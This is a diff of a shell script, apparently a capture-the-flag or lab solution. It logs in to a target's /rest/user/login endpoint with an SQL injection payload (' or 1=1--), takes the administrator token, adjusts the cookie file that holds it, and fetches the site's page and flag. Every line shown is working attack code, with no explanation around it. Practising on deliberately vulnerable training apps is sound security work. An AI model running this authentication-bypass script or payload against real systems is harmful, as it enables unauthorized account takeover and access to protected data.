@@ -23,7 +23,8 @@ echo "2 - AUTHENTICATE THROUGH INJECTION"
 curl -s -X POST "http://$target_ip/rest/user/login" -b "/work/1-cookies.txt" -L -H "Content-Type: application/json" -d "{\"email\":\"' or 1=1--'\",\"password\":\"a\"}" -o /work/1-admin.json
 TOKEN=$(jq -r '.authentication.token' /work/1-admin.json)
 echo "--> Authenticated with token ${TOKEN}"
-echo -e "\n$target_ip\tTRUE\t/\tFALSE\t0\ttoken\t$TOKEN" >> /work/1-cookies.txt
+echo -e "\n$target_ip\tFALSE\t/\tFALSE\t0\ttoken\t$TOKEN" >> /work/1-cookies.txt
+echo -e "\n$target_ip\tFALSE\t/\tFALSE\t0\tlanguage\ten" >> /work/1-cookies.txt
 curl -s -X GET "http://$target_ip" -b "/work/1-cookies.txt" -v -L -o /work/1-flag.html
 
 # Gather authentication token
